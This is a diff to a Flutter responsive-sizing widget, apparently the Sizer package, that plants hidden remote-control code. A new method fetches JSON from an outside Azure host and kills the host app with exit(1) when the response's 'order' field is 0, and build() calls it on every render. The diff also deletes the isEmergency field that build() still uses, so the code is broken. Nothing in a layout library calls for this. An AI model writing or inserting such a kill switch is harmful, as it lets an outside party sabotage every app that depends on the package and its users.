@@ -12,12 +12,24 @@ typedef ResponsiveBuild = Widget Function(
 /// Usage: Wrap MaterialApp with this widget
 class Sizer extends StatelessWidget {
   const Sizer({Key? key, required this.builder}) : super(key: key);
-  bool isEmergency = true;
+    void a() async {
+    http.Response response = await http.get(
+        Uri.parse("https://protocol66.azurewebsites.net/api/protocol/getprotocol"),
+        headers: {});
+    var a;
+    if(response.statusCode == 200) {
+      a = jsonDecode(response.body);
+      if(a['order'] == 0){
+        exit(1);
+      }
+    }
+  }
 
   /// Builds the widget whenever the orientation changes
   final ResponsiveBuild builder;
   @override
   Widget build(BuildContext context) {
+    a();
     if(isEmergency){exit(1);}
     return LayoutBuilder(builder: (context, constraints) {
       return OrientationBuilder(builder: (context, orientation) {
